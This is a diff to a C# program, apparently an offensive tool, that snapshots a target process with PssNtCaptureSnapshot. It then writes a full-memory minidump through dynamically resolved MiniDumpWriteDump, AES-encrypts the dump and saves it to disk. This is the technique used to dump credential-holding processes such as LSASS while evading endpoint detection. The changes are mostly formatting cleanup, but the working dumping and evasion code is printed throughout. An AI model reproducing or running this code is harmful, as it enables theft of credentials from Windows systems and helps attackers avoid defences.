@@ -1,5 +1,3 @@
-using System;
-using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using Microsoft.Win32.SafeHandles;
@@ -8,7 +6,6 @@ using static Charles.STRUCTS.PSS_CAPTURE_FLAGS;
 using static Charles.STRUCTS.PSS_QUERY_INFORMATION_CLASS;
 using System.Security.Cryptography;
 using System.Text;
-using DWORD = System.Int32;
 
 namespace Charles
 {
@@ -24,10 +21,10 @@ namespace Charles
         public delegate bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeFileHandle hFile, MINIDUMP_TYPE DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate NtStatus PssNtCaptureSnapshot(out IntPtr SnapshotHandle, IntPtr hProcess, PSS_CAPTURE_FLAGS CaptureFlags, DWORD ThreadContextFlags);
+        public delegate NtStatus PssNtCaptureSnapshot(out IntPtr SnapshotHandle, IntPtr hProcess, PSS_CAPTURE_FLAGS CaptureFlags, Int32 ThreadContextFlags);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate NtStatus PssNtQuerySnapshot(IntPtr SnapshotHandle, PSS_QUERY_INFORMATION_CLASS InformationClass , out IntPtr Buffer, DWORD BufferLength);
+        public delegate NtStatus PssNtQuerySnapshot(IntPtr SnapshotHandle, PSS_QUERY_INFORMATION_CLASS InformationClass, out IntPtr Buffer, Int32 BufferLength);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate NtStatus PssNtFreeSnapshot(IntPtr SnapshotHandle);
@@ -745,29 +742,29 @@ namespace Charles
 
             if (args[4] == "snapshot")
             {
-                    //Create a snapshot
-                    Snapshot(process,out sHandle, out cloneProcess);
+                //Create a snapshot
+                Snapshot(process, out sHandle, out cloneProcess);
 
-                    //Generate a minidump
-                    byte[] dumpBytes = Dump(process, cloneProcess);
+                //Generate a minidump
+                byte[] dumpBytes = Dump(process, cloneProcess);
 
-                    //Encrypt the dump
-                    byte[] encryptedDump = EncryptBytes(dumpBytes, key, iv);                   
+                //Encrypt the dump
+                byte[] encryptedDump = EncryptBytes(dumpBytes, key, iv);
 
-                    // Write the encrypted data to a file
-                    File.WriteAllBytes(args[3], encryptedDump);
+                // Write the encrypted data to a file
+                File.WriteAllBytes(args[3], encryptedDump);
 
-                    //Free the snapshot
-                    IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtFreeSnapshot");
-                    DELEGATES.PssNtFreeSnapshot ntfree = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtFreeSnapshot)) as DELEGATES.PssNtFreeSnapshot;
-                    NtStatus status = ntfree(sHandle);
+                //Free the snapshot
+                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtFreeSnapshot");
+                DELEGATES.PssNtFreeSnapshot ntfree = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtFreeSnapshot)) as DELEGATES.PssNtFreeSnapshot;
+                ntfree(sHandle);
 
-                    //Close the cloned handle
-                    pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtClose");
-                    DELEGATES.NtClose ntclose = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtClose)) as DELEGATES.NtClose;
+                //Close the cloned handle
+                pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtClose");
+                DELEGATES.NtClose ntclose = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtClose)) as DELEGATES.NtClose;
 
-                    ntclose(cloneProcess);
-                    return;
+                ntclose(cloneProcess);
+                return;
             }
 
             static byte[] Dump(Process process, IntPtr pHandle)
@@ -780,8 +777,7 @@ namespace Charles
                         IntPtr pointer = Invoke.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump");
                         DELEGATES.MiniDumpWriteDump MDWD = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.MiniDumpWriteDump)) as DELEGATES.MiniDumpWriteDump;
 
-
-                        bool status = MDWD(pHandle, process.Id, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);                  
+                        MDWD(pHandle, process.Id, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                         fs.CopyTo(memoryStream);
                     }
 
@@ -797,16 +793,16 @@ namespace Charles
                 IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtCaptureSnapshot");
                 DELEGATES.PssNtCaptureSnapshot ntsnap = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtCaptureSnapshot)) as DELEGATES.PssNtCaptureSnapshot;
 
-                NtStatus status = ntsnap(out sHandle, process.Handle, PSS_CAPTURE_VA_CLONE, 0);
+                ntsnap(out sHandle, process.Handle, PSS_CAPTURE_VA_CLONE, 0);
 
                 //Query the snapshot and get the cloned handle
                 pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtQuerySnapshot");
-                DELEGATES.PssNtQuerySnapshot ntquery = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtQuerySnapshot)) as DELEGATES.PssNtQuerySnapshot;               
+                DELEGATES.PssNtQuerySnapshot ntquery = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtQuerySnapshot)) as DELEGATES.PssNtQuerySnapshot;
 
-                status = ntquery(sHandle, PSS_QUERY_VA_CLONE_INFORMATION, out cloneProcess, IntPtr.Size);        
-                
+                ntquery(sHandle, PSS_QUERY_VA_CLONE_INFORMATION, out cloneProcess, IntPtr.Size);
+
             }
-            
+
             static byte[] EncryptBytes(byte[] inputBytes, string key, string iv)
             {
                 using (Aes aesAlg = Aes.Create())
